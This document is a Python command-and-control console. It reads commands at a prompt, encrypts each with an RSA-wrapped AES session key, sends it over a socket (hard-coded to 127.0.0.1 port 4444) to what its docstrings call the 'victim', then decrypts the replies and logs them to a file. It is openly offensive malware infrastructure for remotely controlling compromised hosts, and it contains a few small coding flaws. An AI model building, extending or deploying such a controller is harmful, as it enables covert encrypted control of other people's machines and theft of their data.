#! /usr/bin/python3
# coding=utf-8

"""
Command and control program
"""

import socket
import time
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

def save_txt(data):
    """
    function that save data in txt
    """
    with open("cmd.txt", 'a', encoding='utf8') as file:
        file.write(data)


def connect(new_socket):
    """
    function that establish the socket
    """
    try:
        host = "127.0.0.1"
        port = 4444
        new_socket.connect((host, port))
    except OSError:
        print("Port in use, Can't open port")

def open_key():
    """
    function that load asimetric key
    """
    with open("id_rsa.pub", encoding='utf8') as file:
        contents = file.read()
        private_key = RSA.import_key(contents)
    return private_key

def session_key_generator(recipient_key):
    """
    function that geerate seession key
    """
    session_key = get_random_bytes(16)
    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)
    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    return session_key, enc_session_key, cipher_aes

def send(cipher_aes,data,enc_session_key,new_socket):
    """
    Function that send data to victim
    """
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    for text in (enc_session_key, cipher_aes.nonce, tag, ciphertext):
        new_socket.send(text)
        time.sleep(0.1)

def get(new_socket):
    """
    Function that get data from victim
    """
    for i in range(3):
        enc_data = new_socket.recv(10240)
        if enc_data != "":
            if i == 0:
                nonce = enc_data
            elif i == 1:
                tag = enc_data
            elif i == 2:
                ciphertext = enc_data

        elif not enc_data:
            break
    return nonce, tag, ciphertext

def decript(session_key, nonce, tag, ciphertext):
    """
    Function that decript data
    """
    try:
        # Decrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    except ValueError:
        print("\033[1;31mNetwork ERROR!!! try again\033[0;0m")
    dataf = data.decode("utf-8")
    return dataf

def main():
    """
    Main function that call other functions
    """
    recipient_key = open_key()
    while True:
        data = str.encode(input("\n>> "))
        save_txt("\n===========================================")
        save_txt("\n>>\t"+data.decode())

        session_key, enc_session_key, cipher_aes = session_key_generator(recipient_key)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
            connect(new_socket)
            send(cipher_aes,data,enc_session_key,new_socket)
            nonce, tag, ciphertext = get(new_socket)
            dataf = decript(session_key, nonce, tag, ciphertext)
            print(f"Received data: \n{dataf}")
            save_txt("\n"+dataf)

if __name__ == "__main__":
    main()
